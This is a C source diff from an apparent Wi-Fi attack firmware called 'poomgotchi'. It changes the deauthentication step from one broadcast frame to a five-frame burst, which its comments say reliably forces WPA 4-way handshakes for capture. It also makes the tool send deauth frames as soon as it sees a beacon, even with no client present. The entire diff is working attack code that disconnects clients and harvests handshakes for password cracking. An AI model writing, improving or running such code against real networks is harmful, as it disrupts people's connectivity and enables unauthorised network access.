@@ -32,6 +32,7 @@
 #define POOMGOTCHI_ASSIST_WAIT_MS     (6000U)
 #define POOMGOTCHI_DEAUTH_MIN_MS      (10000U)
 #define POOMGOTCHI_DIAG_MS            (2000U)  /* [PG] capture diagnostics throttle (issue #45) */
+#define POOMGOTCHI_DEAUTH_BURST       (5U)     /* frames per nudge; one frame rarely forces a 4-way (#45) */
 #define POOMGOTCHI_HEADER_H           (11)
 #define POOMGOTCHI_BOX_Y              (12)
 #define POOMGOTCHI_BOX_H              (40)
@@ -479,10 +480,17 @@ static bool poomgotchi_send_deauth_(void)
 
     if((s_policy == POOMGOTCHI_POLICY_OFF) || !s_capture_running ||
        (target == NULL) || !poomgotchi_deauth_allowed_()) return false;
-    poom_wifi_attacks_broadcast_once(target);
+    /* Fire a short burst, not a single frame: one broadcast deauth rarely knocks
+     * a client off, but a 5-frame burst reliably forces the 4-way handshake
+     * (matches the proven WiFi Detect burst-deauth behaviour) (issue #45). */
+    for(uint8_t i = 0U; i < POOMGOTCHI_DEAUTH_BURST; ++i) {
+        poom_wifi_attacks_broadcast_once(target);
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
     s_last_deauth_ms = poomgotchi_now_ms_();
     ++s_stats.deauths;
-    printf("[PG] deauth sent (policy=%s)\n", poomgotchi_policy_label_());
+    printf("[PG] deauth burst x%u (policy=%s)\n",
+           (unsigned)POOMGOTCHI_DEAUTH_BURST, poomgotchi_policy_label_());
     poomgotchi_request_render_();
     return true;
 }
@@ -793,7 +801,7 @@ static void poomgotchi_task_(void *arg)
             if((hs.valid_pair_count > 0U) || (hs.pmkid_count > 0U)) {
                 poomgotchi_finish_capture_(true);
             } else if((s_policy == POOMGOTCHI_POLICY_ASSIST) && !s_assist_sent &&
-                      (hs.client_count > 0U) && (hs.eapol_message_mask == 0U) &&
+                      (hs.has_beacon || (hs.client_count > 0U)) && (hs.eapol_message_mask == 0U) &&
                       poomgotchi_elapsed_(s_capture_started_ms, POOMGOTCHI_ASSIST_WAIT_MS)) {
                 s_assist_sent = poomgotchi_send_deauth_();
             } else if(poomgotchi_elapsed_(s_capture_started_ms, POOMGOTCHI_CAPTURE_MS)) {
